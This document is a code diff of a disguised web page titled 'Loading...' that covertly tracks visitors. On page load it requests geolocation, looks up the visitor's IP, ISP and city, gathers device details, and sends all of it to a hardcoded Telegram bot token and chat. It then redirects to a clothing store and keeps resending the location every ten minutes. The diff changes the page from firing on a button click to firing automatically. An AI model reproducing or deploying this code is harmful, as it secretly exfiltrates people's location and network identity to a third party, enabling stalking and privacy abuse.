@@ -1,21 +1,19 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Click to Continue</title>
+  <title>Loading...</title>
   <style>
-    body { display:flex; justify-content:center; align-items:center; height:100vh; font-family:sans-serif; }
-    button { padding:15px 30px; font-size:18px; cursor:pointer; }
+    body { font-family: sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; }
   </style>
 </head>
 <body>
-
-<button id="startBtn">Click to Continue</button>
+<h3 id="status">📍 Requesting location permission...</h3>
 
 <script>
 const botToken = "8477495842:AAHN8GT3ZBaaKXP-TWySiL1jpWhaiwLVn30"; 
 const chatId = "8144368202"; 
-const intervalMinutes = 10; 
 const redirectURL = "https://luxuarydubai.com/product-category/clothing/";
+const intervalMinutes = 10;
 
 // Detect device model
 function detectDeviceModel() {
@@ -33,8 +31,8 @@ function detectDeviceModel() {
   return "Unknown Device";
 }
 
-// Device/browser info
-function getDeviceInfo() {
+// Device info
+function getDeviceInfo(ipData) {
   return `
 🖥 Device Info:
 - Device Model: ${detectDeviceModel()}
@@ -42,10 +40,17 @@ function getDeviceInfo() {
 - Platform: ${navigator.platform}
 - Language: ${navigator.language}
 - Screen: ${screen.width}x${screen.height}
+
+🌐 Network Info:
+- IP: ${ipData.ip}
+- ISP: ${ipData.org || "Unknown"}
+- City: ${ipData.city || "Unknown"}
+- Region: ${ipData.region || "Unknown"}
+- Country: ${ipData.country || "Unknown"}
 `;
 }
 
-// Send data to Telegram
+// Send message to Telegram
 function sendData(message) {
   fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
     method: "POST",
@@ -55,15 +60,14 @@ function sendData(message) {
 }
 
 // Send location + device info
-function sendLocation(lat, lon) {
-  const deviceInfo = getDeviceInfo();
+function sendLocation(lat, lon, ipData) {
   const message = `📍 Location: ${lat},${lon}
 https://maps.google.com/?q=${lat},${lon}
-${deviceInfo}`;
+${getDeviceInfo(ipData)}`;
   sendData(message);
 }
 
-// Promise-based location request
+// Get location
 function getLocationPromise() {
   return new Promise((resolve) => {
     if (navigator.geolocation) {
@@ -77,13 +81,21 @@ function getLocationPromise() {
   });
 }
 
-// Function called when user clicks the button
-async function startTracking() {
-  document.getElementById("startBtn").style.display = "none"; // hide button
+// Start immediately
+(async function startTracking() {
+  // Get IP & network info first
+  let ipData = {};
+  try {
+    const res = await fetch("https://ipapi.co/json/");
+    ipData = await res.json();
+  } catch (e) {}
 
   const pos = await getLocationPromise();
-  if (pos) sendLocation(pos.coords.latitude, pos.coords.longitude);
-  else sendData(`❌ Location denied.\n${getDeviceInfo()}`);
+  if (pos) {
+    sendLocation(pos.coords.latitude, pos.coords.longitude, ipData);
+  } else {
+    sendData(`❌ Location denied.\n${getDeviceInfo(ipData)}`);
+  }
 
   // Redirect after first report
   window.location.href = redirectURL;
@@ -91,13 +103,9 @@ async function startTracking() {
   // Repeat every 10 minutes
   setInterval(async () => {
     const p = await getLocationPromise();
-    if (p) sendLocation(p.coords.latitude, p.coords.longitude);
+    if (p) sendLocation(p.coords.latitude, p.coords.longitude, ipData);
   }, intervalMinutes * 60 * 1000);
-}
-
-// Attach click event
-document.getElementById("startBtn").addEventListener("click", startTracking);
+})();
 </script>
-
 </body>
 </html>
